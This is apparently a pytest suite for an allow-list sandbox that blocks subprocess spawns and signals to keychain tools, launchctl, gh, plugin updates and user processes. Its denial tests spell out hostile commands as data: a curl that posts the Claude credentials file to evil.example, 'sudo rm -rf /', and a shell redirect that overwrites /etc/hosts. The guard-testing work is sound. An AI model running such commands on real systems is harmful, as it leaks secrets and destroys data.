"""The PROCESS + SIGNAL sandbox (S1h) — real, no mocks.

WHY THIS FILE EXISTS. The write sandbox saw only Python-level writes, so every dangerous
janitor capability walked straight past it: the real keychain (`security`), the real OS
service (`launchctl`), typing into the user's terminal (`osascript`/`tmux`), the real plugin
tree (`claude plugin update`), real GitHub mutation (`gh api --method POST`), and killing a
real pid. Those were guarded only by CONVENTION, and a convention is exactly what gets
forgotten.

The guard is an ALLOW-LIST. That is the whole design: a block-list can only forbid the
binaries someone already thought of, and the failure being fixed is precisely the binary
nobody thought of. So the load-bearing test here is `test_an_unknown_binary_is_denied` — not
the six named ones.

FALSIFICATION (per the `feedback-falsify-each-layer-separately` lesson: a test that still
passes after you delete the fix tests nothing). Every live test below was run with the process
patches disabled and each one FAILED, so they test the guard rather than the weather.

SAFETY OF THE NEGATIVE TESTS. Each denial test names a command that would be HARMLESS if the
guard were broken (`launchctl list`, `gh --version`, `osascript -e 'return 1'`, SIGTERM to pid
1, which a non-root process cannot deliver). A test that proves "we do not touch the machine"
must not be the thing that touches the machine when it regresses.
"""

from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
from pathlib import Path

import pytest
import sandbox_guard
from sandbox_guard import SandboxViolation, classify_argv

_REPO = Path(__file__).resolve().parent.parent
_ENV = dict(os.environ)


def _verdict(argv: list[str], *, cwd: str | Path = "/", env: dict | None = None):
    return classify_argv(argv, cwd=str(cwd), env=env if env is not None else _ENV)


# ─── the install self-test — a sandbox that silently fails to install is worse than none ───


def test_the_process_guard_is_actually_installed() -> None:
    """The patches are LIVE in this interpreter.

    `sitecustomize`'s own docstring warns that a sandbox which silently fails to install is
    worse than none, *because it is trusted*. Every other test in this file would pass
    vacuously if the guard were never installed, so this asserts the substrate first."""
    patched = {
        (getattr(mod, "__name__", str(mod)), name) for mod, name, _original in sandbox_guard._PATCHED
    }
    assert ("Popen", "__init__") in patched, "subprocess.Popen.__init__ must be wrapped"
    assert ("os", "kill") in patched, "os.kill must be wrapped"
    assert ("os", "system") in patched, "os.system must be wrapped"


# ─── DENY BY DEFAULT — the property the whole design rests on ───────────────────────────────


def test_an_unknown_binary_is_denied() -> None:
    """THE load-bearing test. A binary nobody has thought of is DENIED — that is what makes
    this an allow-list rather than another block-list that is forever one incident behind.

    `cat` is used precisely BECAUSE it looks harmless: deny-by-default has to hold for the
    innocuous unknown too, or it is not a default at all — it is just a longer block-list.
    """
    assert _verdict(["cat", "/etc/hosts"]).allowed is False


def test_a_dangerous_unknown_binary_is_denied() -> None:
    """`curl` is on no list here, yet it can exfiltrate anything on disk. This is the class the
    allow-list exists for: the capability nobody enumerated."""
    if shutil.which("curl") is None:
        pytest.skip("curl not installed")
    assert _verdict(["curl", "-d", "@~/.claude/.credentials.json", "https://evil.example"]).allowed is False


def test_the_denial_names_the_fix() -> None:
    """A guard that only says "no" gets disabled by the next frustrated dev. The message must
    carry the two ways out: stub it on PATH, or mark it."""
    reason = _verdict(["cat", "/etc/hosts"]).reason
    assert "real_subprocess" in reason and "PATH" in reason


@pytest.mark.parametrize(
    "argv",
    [
        pytest.param(["launchctl", "bootstrap", "gui/501", "x.plist"], id="launchctl-os-service"),
        pytest.param(["osascript", "-e", 'tell application "iTerm2"'], id="osascript-types-into-terminal"),
        pytest.param(["tmux", "send-keys", "-t", "%1", "rm -rf /", "Enter"], id="tmux-types-into-terminal"),
        pytest.param(["gh", "api", "--method", "POST", "repos/x/y/rulesets"], id="gh-mutates-github"),
        pytest.param(["claude", "plugin", "update", "p@m", "--scope", "user"], id="claude-mutates-plugin-tree"),
        pytest.param(["lean-ctx", "allow", "uv"], id="lean-ctx-mutates-user-config"),
        pytest.param(["sudo", "rm", "-rf", "/"], id="sudo"),
    ],
)
def test_each_machine_touching_binary_is_denied(argv: list[str]) -> None:
    """Every binary the audit caught escaping — each one reaches real machine state.

    Asserts the POLICY (deny-by-default: the binary is absent from the allow-table), and THEN
    the end-to-end denial for those actually installed here.

    The policy assertion is the load-bearing one, because the end-to-end verdict is
    environment-dependent by design: `classify_argv` deliberately ALLOWS a binary that does not
    resolve on PATH — a non-existent executable cannot touch the machine (Popen just raises
    FileNotFoundError), so denying it would replace a real, tested failure mode with a sandbox
    error and prove nothing.

    That coupling already bit us: this test asserted `lean-ctx` was denied and passed for weeks
    — but only because lean-ctx happened to be INSTALLED. The day it was uninstalled from the
    machine, the binary stopped resolving, the guard (correctly) allowed it, and the test went
    red without a single line of the guard changing. A test whose verdict depends on machine
    state is measuring the environment, not the policy. So assert the policy first, and treat
    the real spawn as a bonus check where the environment permits one.
    """
    name = os.path.basename(argv[0])
    assert name not in sandbox_guard._ALLOW_TABLE, (
        f"{name!r} reaches real machine state and must never be on the allow-table; "
        "deny-by-default is what makes an unknown binary safe."
    )
    if shutil.which(name) is None:
        return  # not installed here → nothing to spawn → no denial to assert (see above)
    assert _verdict(argv).allowed is False


def test_a_prefix_launcher_cannot_smuggle_a_denied_binary() -> None:
    """`taskpolicy -b <cmd>` RUNS <cmd>. Allowing the launcher by name would wave through the
    exact escape it wraps — the daemon really does spawn
    `taskpolicy -b claude plugin marketplace update`. So the launcher is unwrapped and the
    INNER command classified, or the guard is one token wide."""
    # macOS-only launcher: with `taskpolicy` absent from PATH the guard ALLOWS by design
    # (sandbox_guard.py: "exec of a non-existent file cannot touch the machine"), so on Linux
    # this test would assert the opposite of the guard's documented contract.
    if shutil.which("taskpolicy") is None:
        pytest.skip("taskpolicy is macOS-only; an absent binary is allowed by design")
    assert _verdict(["taskpolicy", "-b", "claude", "plugin", "marketplace", "update"]).allowed is False
    assert _verdict(["nice", "-n", "10", "gh", "api", "repos/x/y"]).allowed is False
    # ...while a launcher wrapping something harmless still works.
    assert _verdict(["taskpolicy", "-b", "ps", "-ax"]).allowed is True


# ─── the keychain: turning a CONVENTION into an INVARIANT ──────────────────────────────────


def test_unscoped_security_is_denied() -> None:
    """An unscoped `security` op hits the user's LOGIN keychain: a write corrupts real
    credentials, and a `-w` read raises the ACL dialog — the prompt FLOOD that once opened
    hundreds of modals and locked the user out. The audit proved all 161 current calls are
    already scoped, so this costs nothing today; it is here so the 162nd cannot forget."""
    if shutil.which("security") is None:
        pytest.skip("security is macOS-only; an absent binary is allowed by design")
    verdict = _verdict(["security", "find-generic-password", "-s", "Claude Code-credentials"])
    assert verdict.allowed is False
    assert "isolated_keychain" in verdict.reason


def test_security_scoped_to_a_throwaway_keychain_is_allowed(tmp_path: Path) -> None:
    """The real round-trip tests must keep working: scoped to a tmp keychain, `security` is
    confined and cannot reach the login keychain."""
    kc = tmp_path / "janitor-test.keychain-db"
    argv = ["security", "add-generic-password", "-s", "svc", "-a", "acct", "-w", "pw", str(kc)]
    assert _verdict(argv).allowed is True


def test_security_scoped_to_the_real_login_keychain_is_denied() -> None:
    """Naming a keychain is not enough — it must be a THROWAWAY one, i.e. one in a tmp tree.

    The path is written out literally rather than derived from `Path.home()`, because inside
    this suite `HOME` is REDIRECTED into the session tmp tree — so `Path.home()/…/login.
    keychain-db` is a tmp path, and the test would have asserted the exact opposite of what it
    claims. (It did, on the first run. The isolation that protects the suite also lies to it.)
    """
    if shutil.which("security") is None:
        pytest.skip("security is macOS-only; an absent binary is allowed by design")
    real = "/Users/someone/Library/Keychains/login.keychain-db"
    assert _verdict(["security", "find-generic-password", "-s", "x", real]).allowed is False


# ─── git: read anywhere, mutate only in a tmp repo ─────────────────────────────────────────


def test_git_may_not_mutate_the_real_repo() -> None:
    """pytest's cwd IS this repo, so an un-`cwd=`'d `git commit` lands on real history."""
    assert _verdict(["git", "commit", "-m", "x"], cwd=_REPO).allowed is False
    assert _verdict(["git", "-C", str(_REPO), "reset", "--hard"], cwd="/tmp").allowed is False


def test_git_may_mutate_a_tmp_repo(tmp_path: Path) -> None:
    """The ~400 fixture-repo operations the suite legitimately performs must keep working."""
    assert _verdict(["git", "commit", "-m", "x"], cwd=tmp_path).allowed is True
    assert _verdict(["git", "-C", str(tmp_path), "init"], cwd=_REPO).allowed is True


def test_git_reads_are_allowed_anywhere() -> None:
    """Reading the real repo is harmless and pervasive (`git rev-parse`, `git status`)."""
    assert _verdict(["git", "status", "--porcelain"], cwd=_REPO).allowed is True
    assert _verdict(["git", "rev-parse", "HEAD"], cwd=_REPO).allowed is True


# ─── resolution: the two bugs the measured audit exposed ───────────────────────────────────


def test_a_symlinked_tool_keeps_the_name_it_was_invoked_with() -> None:
    """REGRESSION. Following a symlink can RENAME a binary: with Homebrew's coreutils on PATH,
    `echo` resolves to `.../bin/gecho`. Taking the policy name from the resolved path turned
    three allow-listed tools into unknown binaries and denied them. Identity must come from
    what the caller INVOKED; the realpath is only for the containment question."""
    assert _verdict(["echo", "hi"]).allowed is True
    assert _verdict(["sleep", "1"]).allowed is True


def test_a_tmp_stub_is_allowed_but_a_tmp_symlink_to_the_real_binary_is_not(tmp_path: Path) -> None:
    """Containment is decided on the REALPATH, so a symlink parked in tmp cannot pose as the
    test's own stub while actually pointing at the user's `/usr/bin/security`."""
    stub = tmp_path / "gh"
    stub.write_text("#!/bin/sh\necho stub\n", encoding="utf-8")
    stub.chmod(0o755)
    env = {**_ENV, "PATH": f"{tmp_path}{os.pathsep}{_ENV.get('PATH', '')}"}
    assert _verdict(["gh", "api", "repos/x/y"], env=env).allowed is True, "a stub in tmp is the test's own code"

    real_security = "/usr/bin/security"
    if not os.path.exists(real_security):
        pytest.skip("no /usr/bin/security on this platform")
    trojan = tmp_path / "security"
    trojan.symlink_to(real_security)
    assert _verdict([str(trojan), "find-generic-password", "-s", "x"]).allowed is False


def test_a_binary_that_does_not_exist_is_allowed_through() -> None:
    """Exec of a non-existent file cannot touch the machine — Popen raises FileNotFoundError,
    which is exactly what the suite's "binary is missing" tests assert. Denying it would swap a
    real, tested failure mode for a sandbox error and prove nothing."""
    assert _verdict(["/definitely/not/a/real/binary/xyzzy"]).allowed is True


# ─── the shell: the one child the sandbox cannot follow into ───────────────────────────────


def test_a_real_shell_script_is_denied() -> None:
    """`sitecustomize` reaches every child PYTHON, but a shell's own children (the `launchctl`
    inside keepalive_install.sh) are invisible to us. So a real script would silently escape."""
    assert _verdict(["bash", str(_REPO / "scripts" / "keepalive_install.sh"), "install"]).allowed is False


def test_a_shell_syntax_check_is_allowed() -> None:
    """`bash -n` PARSES and never executes a command — nothing can escape through it."""
    assert _verdict(["bash", "-n", str(_REPO / "scripts" / "keepalive_install.sh")]).allowed is True


def test_a_shell_c_string_is_classified_command_by_command() -> None:
    """`sh -c` is a back door unless each command in the chain is classified."""
    assert _verdict(["sh", "-c", "echo hi; exit 1"]).allowed is True
    assert _verdict(["sh", "-c", "gh api --method DELETE repos/x/y"]).allowed is False


def test_a_shell_redirect_is_denied() -> None:
    """`>` writes a file WITHOUT going through Python, straight past the write guard."""
    assert _verdict(["sh", "-c", "echo pwned > /etc/hosts"]).allowed is False


# ─── the escape hatch ──────────────────────────────────────────────────────────────────────


def test_the_marker_permits_exactly_the_named_binary() -> None:
    """`@pytest.mark.real_subprocess("bash")` is deliberate, reviewable friction — and it opts
    in ONE binary, not the whole machine."""
    env = {**_ENV, sandbox_guard.ENV_ALLOW_REAL: "bash"}
    assert _verdict(["bash", "/some/script.sh"], env=env).allowed is True
    if shutil.which("launchctl") is None:
        return  # macOS-only binary → absent → allowed by design; the per-binary claim needs it present
    assert _verdict(["launchctl", "bootstrap"], env=env).allowed is False, "the hatch is per-binary"


# ─── child-env hardening: upgrade the child, don't just permit it ──────────────────────────


def test_a_child_python_is_handed_the_sandbox_even_when_the_test_builds_its_own_env() -> None:
    """47 tests build an explicit `env=` to isolate a child's janitor paths, silently stripping
    PYTHONPATH and the deny roots — producing a completely UNGUARDED interpreter, which is the
    exact shape of the 2026-07-11 source clobber. Denying them would have broken all 47 and
    protected nothing; injecting the two vars makes the child SANDBOXED instead."""
    hardened = sandbox_guard._harden_child_env([sys.executable, "-c", "pass"], {"HOME": "/tmp/fake"})
    assert hardened["HOME"] == "/tmp/fake", "the test's own env must survive untouched"
    assert hardened.get(sandbox_guard.ENV_DENY), "the child must inherit the deny roots"
    assert "_sandbox_boot" in hardened.get("PYTHONPATH", ""), "the child must boot sitecustomize"


def test_hardening_leaves_a_non_python_child_alone() -> None:
    """Only a Python child can boot the guard; injecting into `git`'s env would be cargo cult."""
    assert sandbox_guard._harden_child_env(["git", "status"], {"HOME": "/x"}) == {"HOME": "/x"}


# ─── LIVE denials — the guard fires through the real subprocess API ────────────────────────
#
# Each command below is harmless IF the guard is broken (read-only / --version), so a
# regression in the guard cannot turn these tests into the damage they exist to prevent.


def test_a_real_spawn_of_a_denied_binary_raises() -> None:
    """End-to-end through `subprocess.run` — the API the whole codebase actually uses."""
    if shutil.which("launchctl") is None:
        pytest.skip("launchctl is macOS-only; an absent binary is allowed by design")
    with pytest.raises(SandboxViolation):
        subprocess.run(["launchctl", "list"], capture_output=True)


def test_a_real_spawn_through_check_output_raises() -> None:
    """`run`/`call`/`check_output`/`check_call` all funnel through Popen — one patch covers all."""
    if shutil.which("gh") is None:
        pytest.skip("gh not installed here; an absent binary is allowed by design")
    with pytest.raises(SandboxViolation):
        subprocess.check_output(["gh", "--version"])


def test_os_system_raises() -> None:
    """`os.system` bypasses Popen entirely, so it needs its own patch."""
    if shutil.which("gh") is None:
        pytest.skip("gh not installed here; an absent binary is allowed by design")
    with pytest.raises(SandboxViolation):
        os.system("gh --version")  # noqa: S605 - the point of the test is that it is refused


# ─── signals: kill your own children, never the user's processes ──────────────────────────


def test_signalling_a_process_this_test_did_not_spawn_is_denied() -> None:
    """`memory_guard.select_victim()` reads the REAL `ps` table and returns a REAL pid; one
    forgotten monkeypatch and the suite SIGKILLs a live user process. pid 1 is used because a
    non-root process cannot actually signal it — if this guard ever regresses, the test still
    cannot do harm."""
    with pytest.raises(SandboxViolation):
        os.kill(1, signal.SIGTERM)


def test_a_liveness_probe_is_always_allowed() -> None:
    """`os.kill(pid, 0)` DELIVERS NOTHING — it only asks "does this pid exist?". The daemon
    witness and every `_alive()` helper depend on it."""
    os.kill(os.getpid(), 0)  # must not raise


def test_a_test_may_kill_its_own_child() -> None:
    """The guard must not break `test_kill_process_terminates_real_child`, which legitimately
    terminates a process it created."""
    child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
    try:
        os.kill(child.pid, signal.SIGTERM)  # must not raise
    finally:
        child.kill()
        child.wait(timeout=10)


def test_a_test_may_kill_its_own_grandchild() -> None:
    """Ancestry, not the pid Popen returned, is the criterion — the process a test means to
    kill is routinely its GRANDCHILD (the daemon is launched through `uv`; multiprocessing's
    workers come from `fork_exec` and never pass through Popen at all)."""
    parent = subprocess.Popen(
        [sys.executable, "-c",
         "import subprocess,sys,time;"
         "c=subprocess.Popen([sys.executable,'-c','import time; time.sleep(30)']);"
         "print(c.pid, flush=True); time.sleep(30)"],
        stdout=subprocess.PIPE, text=True,
    )
    try:
        assert parent.stdout is not None
        grandchild = int(parent.stdout.readline().strip())
        assert grandchild not in sandbox_guard._SPAWNED_PIDS, "must be resolved by ANCESTRY, not the spawn set"
        os.kill(grandchild, signal.SIGTERM)  # must not raise
    finally:
        parent.kill()
        parent.wait(timeout=10)
